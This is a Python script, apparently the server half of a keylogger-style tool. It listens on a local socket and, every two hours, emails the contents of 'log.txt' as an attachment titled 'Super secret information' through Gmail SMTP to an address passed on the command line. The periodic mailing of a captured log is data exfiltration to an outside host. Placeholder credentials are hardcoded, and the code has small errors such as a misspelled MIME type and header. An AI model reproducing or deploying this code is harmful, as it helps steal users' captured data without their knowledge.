import sys,socket,os,time,logging,smtplib
from threading import Thread
from apscheduler.schedulers.background import BackgroundScheduler


from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


class Server():

    def __init__(self):

        self.listen = True
        self.BUFFER_SIZE = 10
        self.filename = "log.txt"
        self.filesize = os.path.getsize(self.filename)
        self.sched = BackgroundScheduler(timezone="Europe/Athens")

        self.logger = logging.getLogger(__name__)
        self.logger.setLevel(logging.INFO)
            
        formatter = logging.Formatter('%(levelname)s:%(name)s:%(message)s')
        file_handler = logging.FileHandler('information.log')
        file_handler.setFormatter(formatter)

        self.logger.addHandler(file_handler)
        
        self.receiver_name = str(sys.argv[1])
        self.serverSocket()

    
    def serverSocket(self):

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        CLIENT = '127.0.0.1'
        PORT = 22344
        s.bind((CLIENT, PORT))
        self.logger.info("Bound into host {}, on port {}\n".format(CLIENT,PORT))
        
        s.listen(5)
        self.clients = 0
        self.sched.add_job(self.send_email, 'interval', minutes = 120)
        self.sched.start()
        
        while True:
            if self.listen == False:
                break
            try:
                clt, addr = s.accept()
                self.logger.info("Recieved connection: {} {}".format(clt,addr))
                self.clients += 1
            except ValueError:
                print("Error in {} {}".format(clt,addr))
            else:
                print("{} is connected".format(addr))
            


    def send_email(self):

        sender_addr = 'ujiosdfghnkl'
        sender_pass = 'safepass123'
        receiver_addr = self.receiver_name + '@gmail.com'
        
        content = ''
        message = MIMEMultipart()
        message['From'] = sender_addr
        message['To'] = receiver_addr
        message['Subject'] = 'Super secret information:'
        message.attach(MIMEText(content, 'plain'))
        attach_file = open(self.filename, 'rb')
        payload = MIMEBase('application', 'octate-stream')
        payload.set_payload((attach_file).read())
        encoders.encode_base64(payload)
        payload.add_header('Content-Decomposition', 'attachment', filename=self.filename)
        message.attach(payload)

        session = smtplib.SMTP('smtp.gmail.com',587)
        session.starttls()
        session.login(sender_addr,sender_pass)
        text = message.as_string()
        
        print("Sending email now...")
        session.sendmail(sender_addr,receiver_addr,text)
        session.quit()
        print("Email sent.")


    def kill(self):
        self.listen = False

myServer = Server()
